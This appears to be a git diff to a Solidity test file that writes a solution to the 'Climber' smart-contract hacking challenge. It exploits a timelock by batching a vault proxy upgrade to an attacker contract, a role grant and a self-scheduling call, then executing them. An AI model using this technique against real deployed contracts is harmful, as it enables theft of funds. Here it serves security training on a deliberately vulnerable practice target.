@@ -100,21 +100,33 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        address[] memory targets = new address[](1);
+        address[] memory targets = new address[](3);
         // targets[0] = address(timelock);
         targets[0] = address(vault);
-        uint256[] memory values = new uint256[](1);
+        targets[1] = address(timelock);
+        targets[2] = address(timelock);
+        uint256[] memory values = new uint256[](3);
         values[0] = 0;
-        // values[1] = 0;
+        values[1] = 0;
+        values[2] = 0;
         Attack attack = new Attack();
-        bytes[] memory dataElements = new bytes[](1);
-        dataElements[0] = // ), //     ClimberTimelock.grantRole(keccak256("PROPOSER_ROLE"), player) // abi.encodeCall(
-        abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(attack), ""));
-        // dataElements[1] = abi.encodeCall(
-        //     AccessControl.grantRole(keccak256("PROPOSER_ROLE"), player)
-        // );
+        bytes[] memory dataElements = new bytes[](3);
+        dataElements[0] = abi.encodeCall(
+            UUPSUpgradeable.upgradeToAndCall,
+            (address(attack), "")
+        );
+        dataElements[1] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            keccak256("PROPOSER_ROLE"),
+            address(timelock)
+        );
 
         bytes32 salt = keccak256("salt");
+        dataElements[2] = abi.encodeCall(
+            timelock.schedule,
+            (targets, values, dataElements, salt)
+        );
+        // timelock.schedule(targets, values, dataElements, salt);
 
         timelock.execute(targets, values, dataElements, salt);
     }
